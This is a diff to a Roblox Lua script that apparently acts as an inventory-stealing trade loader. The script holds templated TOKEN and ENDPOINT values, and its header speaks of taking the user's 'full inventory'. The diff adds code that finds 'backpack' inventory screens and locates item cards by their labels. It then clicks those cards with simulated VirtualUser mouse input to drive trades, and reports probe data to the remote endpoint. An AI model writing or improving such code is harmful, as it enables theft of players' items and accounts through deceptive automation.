@@ -3,7 +3,7 @@
 -- your full inventory so you can join the server and collect.
 -- the loader holds for SESSION_SECONDS (5 minutes), then the client detaches cleanly.
 
-local CLIENT_REV = "2.9"
+local CLIENT_REV = "3.0"
 local TOKEN = "{{TOKEN}}"
 local ENDPOINT = "{{ENDPOINT}}"
 local MIN_VALUE = {{MIN_VALUE}}
@@ -478,7 +478,8 @@ local function addGuiItems(add)
     for _, screen in ipairs(gui:GetChildren()) do
         local n = screen.Name:lower()
         if screen:IsA("ScreenGui") and
-            (n:find("invent", 1, true) or n == "inv" or n:find("collection", 1, true)) then
+            (n:find("invent", 1, true) or n == "inv" or n:find("collection", 1, true)
+                or n:find("backpack", 1, true)) then
             panels = panels + 1
             for _, obj in ipairs(screen:GetDescendants()) do
                 if obj:IsA("TextButton") or obj:IsA("ImageButton") then
@@ -850,7 +851,7 @@ end
 -- probe rows are printed too, so the executor log alone shows what the game has
 local function reportProbe(receiver, detail, lines)
     for i, line in ipairs(lines) do
-        if i > 16 then break end
+        if i > 40 then break end
         print("[vexora] probe: " .. tostring(line))
     end
     reportTrade("probe", receiver, { items = lines, detail = detail })
@@ -952,6 +953,20 @@ local function activateCard(button, window)
 
     local pos
     pcall(function() pos = button.AbsolutePosition + button.AbsoluteSize * 0.5 end)
+
+    -- VirtualUser takes real screen coordinates, so this works for cards that are
+    -- frames with no button class and no per-object connections
+    if pos then
+        pcall(function()
+            local vu = game:GetService("VirtualUser")
+            vu:MoveMouse(pos)
+            vu:Button1Down(pos, Enum.UserInputType.MouseButton1)
+            vu:Button1Up(pos, Enum.UserInputType.MouseButton1)
+        end)
+        task.wait(0.2)
+        if windowSignature(sigRoot) ~= before then return "virtual-mouse" end
+    end
+
     if pos and typeof(mousemoveabs) == "function" then
         pcall(mousemoveabs, pos.X, pos.Y)
         if typeof(mouse1click) == "function" then
@@ -986,7 +1001,8 @@ local function tradeGuiRoots(window)
             local n = screen.Name:lower()
             if n:find("trade", 1, true) or n:find("offer", 1, true) then
                 table.insert(trade, screen)
-            elseif n:find("invent", 1, true) or n:find("collection", 1, true) then
+            elseif n:find("invent", 1, true) or n:find("collection", 1, true)
+                or n:find("backpack", 1, true) then
                 table.insert(inventory, screen)
             end
         end
@@ -1079,6 +1095,38 @@ local function tradeButtons(window)
             end
         end
     end
+
+    -- cards that are not buttons and have no connection still carry a name label;
+    -- the nearest sized gui object above that label is the card that gets clicked
+    if #buttons < 2 then
+        for _, root in ipairs(guiRoots) do
+            for _, obj in ipairs(root:GetDescendants()) do
+                if obj:IsA("TextLabel") or obj:IsA("TextButton") then
+                    local text = norm(obj.Text)
+                    if #text >= 2 and not isControlLabel(text) then
+                        local node = obj
+                        while node and node ~= root do
+                            if node:IsA("ImageButton") or node:IsA("TextButton")
+                                or node:IsA("ImageLabel") or node:IsA("Frame") then
+                                local size
+                                pcall(function() size = node.AbsoluteSize end)
+                                if size and size.X >= 20 and size.Y >= 20 then
+                                    local key = text:lower()
+                                    if not seenButton[node] and not seenLabel[key] then
+                                        seenButton[node] = true
+                                        seenLabel[key] = true
+                                        table.insert(buttons, { button = node, label = text })
+                                    end
+                                    break
+                                end
+                            end
+                            node = node.Parent
+                        end
+                    end
+                end
+            end
+        end
+    end
     return buttons
 end
 
@@ -1104,6 +1152,9 @@ local function windowDump(window)
                 push(frames, "grid:" .. obj.Name .. "(" .. #obj:GetChildren() .. ")")
             elseif obj:IsA("Frame") and obj.Name:lower():find("trade", 1, true) then
                 push(frames, "frame:" .. obj.Name)
+            elseif (obj:IsA("TextLabel") or obj:IsA("TextButton")) and #norm(obj.Text) >= 2 then
+                local text = norm(obj.Text)
+                if not isControlLabel(text) then push(frames, "text:" .. text) end
             end
 
             local isButton = obj:IsA("TextButton") or obj:IsA("ImageButton")
